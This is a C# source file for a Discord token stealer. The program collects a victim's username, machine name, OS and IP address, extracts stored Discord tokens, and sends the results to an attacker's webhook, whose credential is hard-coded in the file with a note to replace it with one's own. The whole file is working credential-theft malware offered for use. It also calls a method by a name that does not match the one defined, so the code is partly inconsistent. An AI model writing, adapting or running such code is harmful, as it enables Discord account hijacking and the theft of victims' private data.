using System.Text;
using DiscordTokenStealer.Discord;

namespace DiscordTokenStealer;
public static class Program
{
    private static async Task Main()
    {
        StringBuilder sb = new StringBuilder()
            .AppendLine($"Username: {Environment.UserName}")
            .AppendLine($"Machine Name: {Environment.MachineName}")
            .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
            .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
            .AppendLine("Tokens: ");
        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await AppendUserSummary(token, sb, cts));
        using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C"); // Replace with your own.
        await webhook.SendMessage(new DiscordMessage(sb.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
    }

    private static async Task AppendSummaryIfValid(string token, StringBuilder sb, CancellationToken cts)
    {
        DiscordClient client = new DiscordClient(token);
        string? summary = await client.GetSummary(cts);
        lock (sb)
        {
            sb.Append(summary);
        }
    }
}
